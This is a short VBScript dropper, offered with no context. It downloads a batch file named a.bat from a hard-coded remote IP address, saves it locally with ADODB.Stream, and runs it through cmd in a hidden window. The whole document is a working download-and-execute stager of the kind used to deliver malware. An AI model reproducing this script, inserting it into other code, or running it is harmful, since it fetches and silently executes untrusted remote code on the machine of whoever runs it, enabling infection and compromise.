dim http_obj
dim stream_obj
Dim strArgs
 
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
Set oShell = CreateObject ("Wscript.Shell")
 
URL = "http://138.197.193.53/a.bat" 'Where to download the file from
FILENAME = "a.bat" 'Name to save the file (on the local system)
strArgs = "cmd /c a.bat" 'Command to run after downloading
 
http_obj.open "GET", URL, False
http_obj.send
 
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2



oShell.Run strArgs, 0, false